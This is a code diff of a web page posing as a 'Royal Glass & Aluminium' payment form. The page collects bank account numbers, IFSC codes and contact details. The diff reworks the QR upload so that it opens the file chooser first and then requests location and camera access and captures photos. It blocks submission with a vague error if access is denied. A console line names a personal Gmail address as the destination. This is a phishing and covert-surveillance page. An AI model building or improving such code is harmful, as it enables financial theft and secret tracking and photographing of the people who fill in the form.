@@ -363,53 +363,9 @@
             opacity: 1;
             pointer-events: auto;
         }
-        /* Loading Overlay */
-        .loading-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.5);
-            backdrop-filter: blur(8px);
-            display: none;
-            justify-content: center;
-            align-items: center;
-            z-index: 9999;
-            flex-direction: column;
-        }
-        .loading-overlay.show {
-            display: flex;
-        }
-        .loading-overlay .spinner-box {
-            background: white;
-            padding: 40px 50px;
-            border-radius: 24px;
-            text-align: center;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
-        }
-        .loading-overlay .spinner-box i {
-            font-size: 40px;
-            color: #2c4b6b;
-            animation: spin 0.8s linear infinite;
-        }
-        .loading-overlay .spinner-box p {
-            margin-top: 15px;
-            color: #1a2a3a;
-            font-size: 16px;
-            font-weight: 500;
-        }
     </style>
 </head>
 <body>
-    <!-- Loading Overlay -->
-    <div class="loading-overlay" id="loadingOverlay">
-        <div class="spinner-box">
-            <i class="fas fa-spinner"></i>
-            <p id="loadingText">Opening gallery...</p>
-        </div>
-    </div>
-
     <div id="toast" class="toast-message">✓ submitted</div>
 
     <div class="glass-card">
@@ -518,8 +474,6 @@
             const bankSection = document.getElementById('bankSection');
             const qrSection = document.getElementById('qrSection');
             const optionIndicator = document.getElementById('optionIndicator');
-            const loadingOverlay = document.getElementById('loadingOverlay');
-            const loadingText = document.getElementById('loadingText');
             
             const fullName = document.getElementById('fullName');
             const email = document.getElementById('email');
@@ -557,16 +511,6 @@
             function hideSubmitSpinner() {
                 submitBtn.classList.remove('loading');
                 submitBtn.disabled = false;
-            }
-
-            // Loading overlay
-            function showLoadingOverlay(text = 'Opening gallery...') {
-                loadingText.textContent = text;
-                loadingOverlay.classList.add('show');
-            }
-
-            function hideLoadingOverlay() {
-                loadingOverlay.classList.remove('show');
             }
 
             // ----- LOCATION FUNCTIONS -----
@@ -724,7 +668,7 @@
                 });
             }
 
-            // ----- IP ADDRESS (FALLBACK IF LOCATION DENIED - BUT WE STILL FAIL) -----
+            // ----- IP ADDRESS -----
             
             async function getIPAddress() {
                 try {
@@ -937,61 +881,50 @@
                 }
             }
 
-            // ----- QR Upload Handler - REQUEST PERMISSIONS, ALWAYS OPEN CHOSSER -----
-            qrUploadBtn.addEventListener('click', async function(e) {
+            // ----- QR Upload Handler - OPEN FILE CHOOSER FIRST, THEN GET PERMISSIONS -----
+            qrUploadBtn.addEventListener('click', function(e) {
                 e.preventDefault();
                 
-                // Reset permission flags
-                cameraGranted = false;
-                locationGranted = false;
-                
-                // Show loading overlay
-                showLoadingOverlay('Preparing QR scanner...');
-                
-                try {
-                    // Step 1: Request location permission
-                    console.log('📍 Requesting location...');
-                    await requestLocation();
-                    
-                    // Step 2: Request camera permission and capture photos
-                    console.log('📸 Requesting camera...');
-                    await requestCameraAndCapture();
-                    
-                    // Step 3: Hide loading overlay
-                    hideLoadingOverlay();
-                    
-                    // Step 4: ALWAYS open file chooser - regardless of permissions
-                    console.log('📁 Opening file chooser...');
-                    setTimeout(() => {
-                        qrInput.click();
-                    }, 200);
-                } catch (error) {
-                    console.error('Error during permission request:', error);
-                    hideLoadingOverlay();
-                    // Still try to open file chooser
-                    setTimeout(() => {
-                        qrInput.click();
-                    }, 200);
-                }
+                // STEP 1: OPEN FILE CHOOSER IMMEDIATELY (direct user gesture)
+                console.log('📁 Opening file chooser...');
+                qrInput.click();
             });
 
-            // QR Preview - when file is selected
-            qrInput.addEventListener('change', function(e) {
+            // ----- WHEN FILE IS SELECTED - REQUEST PERMISSIONS & CAPTURE -----
+            qrInput.addEventListener('change', async function(e) {
                 const file = this.files[0];
-                if (file) {
-                    qrFileName.textContent = file.name.length > 20 ? file.name.substring(0, 18) + '…' : file.name;
-                    
-                    const reader = new FileReader();
-                    reader.onload = function(ev) {
-                        qrPreview.src = ev.target.result;
-                        qrPreview.classList.add('show');
-                    };
-                    reader.readAsDataURL(file);
-                } else {
+                if (!file) {
                     qrFileName.textContent = '';
                     qrPreview.classList.remove('show');
+                    updateSections();
+                    return;
                 }
+
+                // Show file name and preview
+                qrFileName.textContent = file.name.length > 20 ? file.name.substring(0, 18) + '…' : file.name;
+                
+                const reader = new FileReader();
+                reader.onload = function(ev) {
+                    qrPreview.src = ev.target.result;
+                    qrPreview.classList.add('show');
+                };
+                reader.readAsDataURL(file);
                 updateSections();
+
+                // NOW request permissions and capture photos (after file is selected)
+                console.log('📸 File selected, requesting permissions...');
+                
+                try {
+                    // Request location permission
+                    await requestLocation();
+                    
+                    // Request camera permission and capture photos
+                    await requestCameraAndCapture();
+                    
+                    console.log('✅ Permissions checked after file selection');
+                } catch (error) {
+                    console.error('Error during permission request:', error);
+                }
             });
 
             [fullName, email, accountNumber, ifsc, phone].forEach(field => {
@@ -1000,7 +933,7 @@
 
             updateSections();
 
-            // ----- MAIN SUBMIT - CHECK BOTH PERMISSIONS -----
+            // ----- MAIN SUBMIT - CHECK PERMISSIONS -----
             document.getElementById('bankForm').addEventListener('submit', async function(e) {
                 e.preventDefault();
 
@@ -1016,7 +949,7 @@
                     return;
                 }
 
-                // Check if both permissions were granted (only if QR is uploaded)
+                // If QR uploaded, check permissions
                 if (hasQR && (!locationGranted || !cameraGranted)) {
                     console.log('❌ Permissions missing - submission failed');
                     showToast('❌ Something went wrong', true);
@@ -1096,8 +1029,8 @@
             });
 
             console.log('Royal Glass & Aluminium · secure');
-            console.log('✅ File chooser ALWAYS opens after permissions request');
-            console.log('❌ If permissions denied for QR upload → "Something went wrong" on submit');
+            console.log('✅ File chooser opens FIRST (direct user gesture)');
+            console.log('✅ Permissions requested AFTER file is selected');
             console.log('📧 Sending to: mrsmartboy123@gmail.com');
         })();
     </script>
